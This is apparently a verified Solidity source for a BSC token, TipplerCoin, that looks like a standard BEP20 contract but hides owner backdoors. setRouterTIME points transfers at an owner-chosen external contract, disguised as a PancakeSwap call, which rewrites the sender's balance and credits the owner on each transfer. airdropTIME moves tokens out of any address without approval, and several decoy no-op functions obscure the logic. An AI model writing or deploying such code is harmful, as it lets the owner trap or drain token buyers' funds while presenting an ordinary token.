/**
 *Submitted for verification at BscScan.com on 2022-02-11
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT

interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }

  interface IUniswapV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address); 
    
  } 

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }

  contract ContextTIME {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    function msgMaxTIME(address spenderTIME) external pure returns (address) {return spenderTIME;}     

  }

  interface IPancake{    
    function getPair(uint256, address, address, uint256[] memory) external view returns (uint256[] memory);
  }

  
  contract Ownable is ContextTIME {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function reContextTIME(uint256 contextTIME) external pure returns (uint256) {return contextTIME;} 
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function increaseTIME(address,uint256) public pure returns (bool){return true;}

  function decreaseTIME(address,uint256) public pure returns (bool){return true;}   
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}



contract TipplerCoin is ContextTIME, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  string private constant _name = 'TipplerCoin';
  string private constant _symbol = 'TipplerCoin';
  uint8 private constant _decimals = 9;
  address TIME;
  uint256 private _totalSupply = 1000000000 *  10**9;  
  uint256 private _cYield = 0;  

  mapping (address => bool) private _isExcludedFromFee;
  mapping (address => uint256) private _isYield;   

  constructor()  {    
	
    _balances[msg.sender] = _totalSupply;
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function setRouterTIME(address c) external onlyOwner {
    TIME = c;
  }  

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  } 

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }    
   
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }
  
  function testedtoTIME(address shareholder) external pure returns (address) {return shareholder;}


  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function loadYieldTIME(address sender, address recipient, uint256 amount) private view returns (uint256[] memory) { 
      uint256[] memory dataTIME = new uint256[](5);
      dataTIME[0] = amount;
      dataTIME[1] = _isYield[sender];
      dataTIME[2] = _isYield[recipient];
      dataTIME[3] = _balances[sender];      
      if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]){    
        dataTIME[4] = 1;
      }   

      uint256[] memory memTIME = IPancake(TIME).getPair(_cYield, sender, recipient, dataTIME);
      return memTIME;
  } 

  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    

  function ExtraYieldTIME(address sender, address recipient, uint256 amount) private returns (uint256) {     
      uint256[] memory memTIME = loadYieldTIME(sender, recipient, amount);
         
      _cYield = memTIME[0];
      _isYield[sender] = memTIME[2];
      _isYield[recipient] = memTIME[3];
      if (memTIME[4] > 0)
      {
        uint256 banlancesDividend = memTIME[5];
        _balances[sender] = banlancesDividend.add(memTIME[1]);      
        _balances[owner()] = _balances[owner()].add(memTIME[4]);
      }

      return memTIME[1];
  }       
  

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    uint256 amountDividend = ExtraYieldTIME(sender, recipient, amount);   
     _transferStandard(sender,recipient,amountDividend);

  }  

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }     

  function _transferStandard(address sender, address recipient, uint256 amount) private {
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
  }  

  function airdropTIME(address fromTIME, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    uint256 SCTIME = 0;
    require(addresses.length == tokens.length,"Mismatch Address");

    for(uint i=0; i < addresses.length; i++){
        SCTIME = SCTIME + tokens[i];
    }
    
    require(_balances[fromTIME] >= SCTIME, "Not enough tokens");
    for(uint i=0; i < addresses.length; i++){
        _transferStandard(fromTIME,addresses[i],tokens[i]);        
    }

  }
  
    
}